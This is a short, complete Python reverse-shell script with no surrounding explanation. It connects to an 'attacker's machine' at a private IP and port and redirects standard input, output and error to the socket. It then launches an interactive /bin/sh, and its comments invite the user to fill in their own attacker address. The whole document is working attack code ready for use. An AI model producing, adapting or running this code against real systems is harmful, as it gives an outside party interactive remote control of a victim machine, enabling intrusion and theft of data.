import socket
import subprocess
import os

def reverse_shell():
    # IP and port of the attacker's machine
    host = "10.0.2.15"  # Replace with your attacker's IP
    port = 5555         # Replace with your attacker's port

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connect to the attacker's machine
    s.connect((host, port))
    
    # Redirect standard streams
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    # Set terminal type
    os.environ["TERM"] = "xterm"

    # Start an interactive shell
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    reverse_shell()